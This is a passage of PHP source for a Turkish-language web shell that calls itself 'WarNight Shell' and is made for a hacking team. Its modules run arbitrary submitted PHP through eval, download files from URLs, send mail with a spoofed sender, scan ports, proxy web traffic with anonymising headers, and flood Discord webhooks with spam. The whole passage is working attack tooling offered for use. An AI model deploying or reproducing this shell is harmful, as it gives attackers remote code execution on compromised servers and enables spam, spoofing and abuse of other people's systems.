                    else echo "<div class='status-message status-error'>Dosya çekilemedi veya kaydedilemedi. Hata: ".htmlspecialchars(curl_error($ch))."</div>";
                    curl_close($ch); fclose($fp);
                }
                echo "<form method='post' action='" . create_url('urldownloader', $current_dir) . "'>";
                echo "<label for='file_url'>Dosya URL'si</label><input type='url' name='file_url' id='file_url' placeholder='https://example.com/file.txt' required>";
                echo "<label for='user_agent'>User-Agent (İsteğe Bağlı)</label><input type='text' name='user_agent' id='user_agent' placeholder='Googlebot/2.1 (+http://www.google.com/bot.html)'>";
                echo "<label for='mime_type'>Accept MIME Type (İsteğe Bağlı)</label><input type='text' name='mime_type' id='mime_type' placeholder='application/json'>";
                echo "<label for='custom_headers'>Özel Headerlar (Her biri yeni satırda)</label><textarea name='custom_headers' id='custom_headers' rows='3' placeholder='Cookie: name=value'></textarea>";
                echo "<input type='submit' value='İndir'></form></div>";
                break;

            case 'phpeval':
                echo "<div class='module'><h2><i class='bi bi-filetype-php'></i> PHP Değerlendirici</h2><p class='description'>PHP kodunu direkt sunucuda çalıştırın.</p>";
                if (isset($_POST['php_code'])) {
                    echo "<h3>Çıktı</h3><pre>";
                    ob_start(); eval("?>".$_POST['php_code']); $output = ob_get_clean();
                    echo htmlspecialchars($output);
                    echo "</pre>";
                }
                echo "<form method='post' action='" . create_url('phpeval', $current_dir) . "'>";
                echo "<label for='php_code'>PHP Kodu</label><textarea name='php_code' id='php_code' rows='10' placeholder='phpinfo();' required></textarea>";
                echo "<input type='submit' value='Çalıştır'></form></div>";
                break;
                
            case 'mail':
                 echo "<div class='module'><h2><i class='bi bi-envelope'></i> Mail Gönderici</h2><p class='description'>Sunucu üzerinden mail gönderin.</p>";
                if (isset($_POST['to'])) {
                    if (@mail($_POST['to'], $_POST['subject'], $_POST['message'], "From: ".$_POST['from'])) echo "<div class='status-message status-success'>Mail başarıyla gönderildi.</div>";
                    else echo "<div class='status-message status-error'>Mail gönderilirken bir hata oluştu.</div>";
                }
                echo "<form method='post' action='" . create_url('mail', $current_dir) . "'>";
                echo "<label for='to'>Alıcı</label><input type='email' name='to' id='to' required>";
                echo "<label for='from'>Gönderen</label><input type='email' name='from' id='from' value='root@localhost' required>";
                echo "<label for='subject'>Konu</label><input type='text' name='subject' id='subject' required>";
                echo "<label for='message'>Mesaj</label><textarea name='message' id='message' rows='5' required></textarea>";
                echo "<input type='submit' value='Gönder'></form></div>";
                break;

            case 'portscan':
                 echo "<div class='module'><h2><i class='bi bi-broadcast'></i> Port Tarayıcı</h2><p class='description'>Hedefteki açık portları bulun.</p>";
                if (isset($_POST['ip_address']) && isset($_POST['port_range'])) {
                    $ip = $_POST['ip_address']; $ports_str = $_POST['port_range'];
                    echo "<h3>" . htmlspecialchars($ip) . " Taranıyor...</h3><pre>";
                    $ports = []; $ranges = explode(',', $ports_str);
                    foreach ($ranges as $range) {
                        if (strpos($range, '-') !== false) { list($start, $end) = explode('-', $range); for ($i = (int)$start; $i <= (int)$end; $i++) $ports[] = $i; } 
                        else $ports[] = (int)$range;
                    }
                    if (count($ports) > 256) echo "Hata: Güvenlik nedeniyle en fazla 256 port taranabilir.\n";
                    else foreach ($ports as $port) { if ($fp = @fsockopen($ip, $port, $errno, $errstr, 0.5)) { echo "Port " . $port . " : Açık\n"; fclose($fp); } flush(); ob_flush(); }
                    echo "</pre>";
                }
                echo "<form method='post' action='" . create_url('portscan', $current_dir) . "'>";
                echo "<label for='ip_address'>IP Adresi</label><input type='text' name='ip_address' id='ip_address' placeholder='127.0.0.1' required>";
                echo "<label for='port_range'>Portlar (Örn: 22,80,443,8000-8100)</label><input type='text' name='port_range' id='port_range' placeholder='21,22,80,443' required>";
                echo "<input type='submit' value='Tara'></form></div>";
                break;

            case 'proxy':
                echo "<div class='module'><h2><i class='bi bi-globe'></i> Web Tarayıcı</h2><p class='description'>Sunucuyu proxy olarak kullanın.</p>";
                if (isset($_POST['proxy_url'])) {
                    $url = $_POST['proxy_url'];
                    if (filter_var($url, FILTER_VALIDATE_URL)) {
                        $ch = curl_init($url);
                        curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_HTTPHEADER => get_anon_headers(), CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36']);
                        $html = curl_exec($ch);
                        $error = curl_error($ch);
                        curl_close($ch);
                        if ($html) {
                            $base_tag = "<base href='" . htmlspecialchars($url) . "'>";
                            $html = str_ireplace('<head>', '<head>' . $base_tag, $html);
                            echo "<h3>" . htmlspecialchars($url) . "</h3><iframe srcdoc='" . htmlspecialchars($html) . "'></iframe>";
                        } else echo "<div class='status-message status-error'>URL'den veri çekilemedi. Hata: " . htmlspecialchars($error) . "</div>";
                    } else echo "<div class='status-message status-error'>Geçerli bir URL girin.</div>";
                }
                echo "<form method='post' action='" . create_url('proxy', $current_dir) . "'>";
                echo "<label for='proxy_url'>URL</label><input type='text' name='proxy_url' id='proxy_url' placeholder='https://example.com' required>";
                echo "<input type='submit' value='Git'></form></div>";
                break;
            
            case 'domaininfo':
                echo "<div class='module'><h2><i class='bi bi-info-circle'></i> Domain Bilgisi</h2><p class='description'>Domainin kimin üzerine kayıtlı olduğunu öğrenin.</p>";
                if (isset($_POST['domain'])) {
                    $domain = $_POST['domain'];
                    echo "<h3>" . htmlspecialchars($domain) . " Bilgileri</h3><pre>";
                    echo "--- WHOIS ---\n" . htmlspecialchars(exec_command("whois " . escapeshellarg($domain)));
                    echo "\n--- DNS ---\n" . htmlspecialchars(exec_command("nslookup " . escapeshellarg($domain)));
                    echo "</pre>";
                }
                echo "<form method='post' action='" . create_url('domaininfo', $current_dir) . "'>";
                echo "<label for='domain'>Domain</label><input type='text' name='domain' id='domain' placeholder='example.com' required>";
                echo "<input type='submit' value='Sorgula'></form></div>";
                break;

            case 'base64':
                echo "<div class='module'><h2><i class='bi bi-code-square'></i> Base64 Çevirici</h2><p class='description'>Metinleri Base64'e çevirin ya da Base64'ten çözün.</p>";
                if (isset($_POST['b64_text'])) {
                    if ($_POST['b64_action'] == 'encode') $result = base64_encode($_POST['b64_text']);
                    else $result = base64_decode($_POST['b64_text']);
                    echo "<h3>Sonuç</h3><pre>" . htmlspecialchars($result) . "</pre>";
                }
                echo "<form method='post' action='" . create_url('base64', $current_dir) . "'>";
                echo "<label for='b64_text'>Metin</label><textarea name='b64_text' id='b64_text' rows='5' required></textarea>";
                echo "<div style='display: flex; gap: 10px;'><input type='submit' name='b64_action' value='encode' style='flex-grow: 1;'><input type='submit' name='b64_action' value='decode' style='flex-grow: 1;'></div>";
                echo "</form></div>";
                break;
                
            case 'discord':
                echo "<div class='module'><h2><i class='bi bi-discord'></i> Discord Webhook Spammer</h2><p class='description'>Bir webhook URL'sine durmadan mesaj yollayın.</p>";
                if (isset($_POST['webhook_url']) && isset($_POST['message'])) {
                    $webhook_url = $_POST['webhook_url'];
                    $message = $_POST['message'];
                    $count = (int)$_POST['count'];
                    $delay = (int)$_POST['delay'];
                    $payload = json_encode(["content" => $message]);
                    
                    echo "<h3>Spam Başlatıldı...</h3><pre>";
                    $success_count = 0;
                    for ($i = 0; $i < $count; $i++) {
                        $ch = curl_init($webhook_url);
                        curl_setopt_array($ch, [
                            CURLOPT_CUSTOMREQUEST => "POST", CURLOPT_POSTFIELDS => $payload, CURLOPT_RETURNTRANSFER => true,
                            CURLOPT_HTTPHEADER => array_merge(['Content-Type: application/json'], get_anon_headers())
                        ]);
                        $response = curl_exec($ch);
                        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                        if ($http_code >= 200 && $http_code < 300) {
                            echo "Mesaj " . ($i + 1) . " gönderildi. (HTTP " . $http_code . ")\n";
                            $success_count++;
                        } else {
                            echo "Mesaj " . ($i + 1) . " gönderilemedi! (HTTP " . $http_code . ") Hata: " . htmlspecialchars($response) . "\n";
                        }
                        curl_close($ch);
                        flush(); ob_flush();
                        usleep($delay * 1000);
                    }
                    echo "</pre><div class='status-message status-success'>Spam tamamlandı. " . $count . " mesajdan " . $success_count . " tanesi başarıyla gönderildi.</div>";
                }
                echo "<form method='post' action='" . create_url('discord', $current_dir) . "'>";
                echo "<label for='webhook_url'>Discord Webhook URL</label><input type='url' name='webhook_url' id='webhook_url' required>";
                echo "<label for='message'>Mesaj</label><textarea name='message' id='message' rows='3' required></textarea>";
                echo "<label for='count'>Tekrar Sayısı</label><input type='number' name='count' id='count' value='10' min='1' required>";
                echo "<label for='delay'>Gecikme (milisaniye)</label><input type='number' name='delay' id='delay' value='500' min='0' required>";
                echo "<input type='submit' value='Spam Başlat'></form></div>";
                break;
        }
        ?>
    </div>
</div>
<script>
document.getElementById('profilePic').addEventListener('click', function() {
    alert('WarNight Shell\n\n bu webshell warnight hack team üyeleri için özel olarak hazırlanmıştır, herkese iyi kullanımlar dilerim:) \n\n\nWarNight Hack Team\n\nhttps://warnighthackteam.rfgd/ \n\n https://discord.gg/QRppCpjvZc');
});
</script>
</body>
</html>
